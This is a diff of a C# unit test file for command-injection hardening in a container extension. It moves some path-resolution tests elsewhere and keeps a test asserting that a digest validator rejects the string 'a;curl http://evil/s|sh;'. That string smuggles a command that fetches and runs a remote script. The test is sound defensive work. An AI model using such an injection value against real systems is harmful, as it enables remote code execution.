@@ -8,7 +8,8 @@ namespace ContainerExtension.UnitTests;
 
 /// <summary>
 /// Regression suite for external-command hardening: strict SHA-256 digest validation before a build-arg
-/// reaches the terminal, and absolute-path resolution of system utilities to defeat PATH hijacking.
+/// reaches the terminal. (Absolute-path resolution of system utilities now lives in
+/// <see cref="DaemonEndpointValidatorTests"/>.)
 /// </summary>
 public sealed class ExternalCommandHardeningTests
 {
@@ -38,29 +39,5 @@ public sealed class ExternalCommandHardeningTests
         var payload = "a;curl http://evil/s|sh;" + new string('a', 40);
         Assert.Equal(64, payload.Length);
         Assert.Null(GitHubReleaseClient.NormalizeSha256Digest(payload));
-    }
-
-    [Theory]
-    [InlineData("stat")]
-    [InlineData("id")]
-    [InlineData("open")]
-    [InlineData("xdg-open")]
-    public void ResolveTrustedUnixBinary_ReturnsRootedAbsolutePath(string name)
-    {
-        var resolved = DockerExecutionStrategy.ResolveTrustedUnixBinary(name);
-        Assert.True(Path.IsPathRooted(resolved), $"'{resolved}' must be absolute, never resolved via PATH");
-        Assert.EndsWith("/" + name, resolved, StringComparison.Ordinal);
-    }
-
-    [Fact]
-    public void ResolveTrustedUnixBinary_PrefersAnExistingTrustedLocation()
-    {
-        if (!OperatingSystem.IsMacOS() && !OperatingSystem.IsLinux())
-        {
-            return; // POSIX-only: /usr/bin or /bin
-        }
-        var resolved = DockerExecutionStrategy.ResolveTrustedUnixBinary("stat");
-        // stat is a coreutils/BSD staple present on every supported POSIX host.
-        Assert.True(File.Exists(resolved), $"expected a real binary at '{resolved}'");
     }
 }
